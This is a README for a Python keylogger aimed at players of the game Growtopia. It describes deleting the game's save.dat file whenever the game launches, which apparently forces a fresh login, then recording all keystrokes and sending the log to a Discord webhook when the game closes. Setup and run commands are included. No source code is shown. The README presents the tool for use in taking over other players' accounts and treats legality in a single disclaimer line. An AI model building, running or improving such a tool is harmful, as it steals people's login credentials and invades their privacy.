# Growtopia Keylogger and Save File Deletion Script

## Overview

This Python script functions as a keylogger specifically for the game **Growtopia**. It continuously monitors whether the game is running and performs the following actions:

1. **Deletes the `save.dat` file** from the Growtopia local directory upon starting the game.
2. **Logs keystrokes** while the game is active.
3. **Sends the logged keystrokes** to a specified Discord webhook when the game is closed.

## Features

- **Keystroke Logging**: Captures and logs all keystrokes made while Growtopia is running.
- **File Deletion**: Automatically deletes the `save.dat` file located in `C:\Users\Mohd\AppData\Local\Growtopia` when Growtopia is started.
- **Discord Integration**: Sends the keystroke log file to a specified Discord channel via a webhook after the game closes.
- **Continuous Monitoring**: Checks the game's status in real-time with no delay.

## Requirements

To run this script, you need to have Python installed on your machine. You also need the following Python packages:

- `psutil`
- `pynput`
- `requests`

You can install the required packages automatically by running the script, which will check and install them if they're missing.

## Installation

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/xMandq/growtopia-keylogger.git
   cd growtopia-keylogger
   
2. **Run the Script**:
   Ensure you have the necessary permissions to run scripts that monitor processes and record keystrokes.
   
4. **Configure Webhook URL**:
     Open the script in a text editor and replace `YOUR_DISCORD_WEBHOOK_URL` with your actual Discord webhook URL.

## Usage

1. **Run the Script**: 
   Ensure that you have the necessary permissions to run scripts that monitor processes and record keystrokes. Execute the script using the command:

   `python keylogger.py`

2. **Check Game Status**: 
   The script will continuously check if Growtopia is running. If Growtopia is detected, the following actions will occur:
   - The script will delete the `save.dat` file located at `C:\Users\Mohd\AppData\Local\Growtopia`.
   - The keylogger will start capturing keystrokes while the game is active.

3. **End of Session**:
   - When you close Growtopia, the script will stop logging keystrokes and automatically send the log file to the configured Discord webhook.
   - You will receive a notification in your Discord channel indicating that the log file has been sent.

4. **Monitor Console Output**:
   - Keep an eye on the console for real-time updates on the script's actions, such as when Growtopia starts and stops or when files are deleted or sent.

## Important Notes

- **Permissions**: Running this script may require administrative permissions depending on your system settings and security software.
- **Privacy Considerations**: This keylogger records keystrokes and sends the log file to a Discord webhook. Ensure you are compliant with local laws and have permission to log keystrokes on the system being used.
- **Dependencies**: The script uses the following Python packages: `psutil`, `pynput`, and `requests`. If not already installed, they will be automatically downloaded.
- **Error Handling**: Be aware that errors may occur if Growtopia is not installed in the specified path or if there are issues with file permissions.
